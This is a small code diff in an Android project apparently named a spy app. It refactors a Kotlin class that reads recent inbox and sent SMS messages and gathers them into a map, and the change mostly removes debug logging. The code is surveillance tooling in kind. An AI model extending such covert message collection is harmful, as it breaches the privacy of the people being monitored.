@@ -3,20 +3,18 @@ package com.komnacki.androidspyapp.sms
 import android.content.ContentResolver
 import android.content.Context
 import android.net.Uri
-import android.util.Log
 import com.komnacki.androidspyapp.Message
 
 class SmsState(override var context: Context) :
     Message {
 
     init {
-        Log.d("KK: ", "SmsState")
         getSms(context)
     }
 
     companion object {
 
-        val SMS_COUNT_LIMIT = 10
+        const val SMS_COUNT_LIMIT = 10
 
         private val info: MutableMap<String, Any> = mutableMapOf()
         private lateinit var contentResolver: ContentResolver
@@ -28,12 +26,8 @@ class SmsState(override var context: Context) :
             val sentSmses: MutableList<MessagePOJO> = getMessages(MessageType.SENT) as MutableList<MessagePOJO>
 
             inboxSmses.addAll(sentSmses)
-//            inboxSmses.sortBy { m -> m.dateSend }
-
-            Log.d("KK: ", "sms list lenght: " + inboxSmses.size)
 
             inboxSmses.forEach { m ->
-                Log.d("KK: ", "getSms: sms tag: " + m.date)
                 info.put(m.date!!, m)
             }
         }
@@ -50,8 +44,6 @@ class SmsState(override var context: Context) :
                 while (cursorInbox.moveToNext()) {
                     if (counter < SMS_COUNT_LIMIT) {
                         counter ++
-
-                        //Przesuniecie, bo wybieram nie wszystkie pola
                         list.add(
                             MessagePOJO(
                                 if (cursorInbox.isNull(0)) - 1 else cursorInbox.getLong(0),
@@ -85,8 +77,7 @@ class SmsState(override var context: Context) :
                         break
                     }
                 }
-            } else {
-            }
+            } else { /* no action*/ }
             cursorInbox.close()
             return list
         }
